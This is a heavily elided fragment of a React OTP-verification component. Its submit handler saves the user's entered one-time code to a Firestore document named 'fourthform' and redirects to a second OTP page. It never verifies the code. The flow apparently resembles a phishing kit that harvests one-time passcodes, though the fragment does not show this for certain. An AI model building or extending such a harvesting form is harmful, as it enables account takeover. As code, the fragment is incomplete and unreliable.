...
export default function OTPVerification() {
  ...
  const handleSubmit = async (e: React.FormEvent) => {
    ...
    try {
      // Store OTP data in "users" database, document "fourthform", with UID as field name
      const fourthformDocRef = doc(db, "users", "fourthform")
      await setDoc(fourthformDocRef, {
        [uid]: {
          otpCode: otpCode,
          uid: uid,
      ...
      // Navigate to otp2 page with the same UID
      router.push(`/otp2?uid=${uid}`)
        ...
        <div className="w-full max-w-[600] mb-40">
          ...
          <div className="mb-8">
            ...
            <div className="w-full bg-slate-300 h-6 rounded-sm overflow-hidden flex items-center">
              ...
              <div
                className="h-full w-1/3 flex items-center justify-center text-white text-sm font-bold relative"
                style={{
